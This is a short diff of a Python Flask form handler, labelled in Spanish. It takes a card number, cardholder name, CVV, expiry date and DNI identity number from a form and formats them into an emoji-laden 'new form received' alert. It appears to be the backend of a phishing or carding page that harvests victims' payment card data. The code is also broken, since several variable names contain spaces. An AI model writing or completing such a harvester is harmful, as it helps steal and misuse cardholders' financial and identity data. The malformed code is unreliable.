@@ -15,16 +15,16 @@ def index():
 def submit():
     numero de tarjeta = request.form.get("numero de tarjeta")
     nombre de titular = request.form.get("nombre de titular")
-    CVV = request.form.get("CVV")
+    cvv = request.form.get ("cvv")
     fecha de vencimiento = request.form.get("fecha de vencimiento")
     dni = request.form.get("dni")
 
     mensaje = f"""
 📩 Nuevo formulario recibido:
 👤 numero de tarjeta: {numero de tarjeta}
-🏠 nombre de titular: {nombre de titular}#
-📞 CVV: {CVV}
-📅 fecha de vencimiento (AA/MM): {fecha de vencimiento}
+🏠 nombre de titular: {nombre de titular}
+📞 cvv: {cvv}
+📅 fecha de vencimiento: {fecha de vencimiento}
 📍 dni: {dni}
     """
 
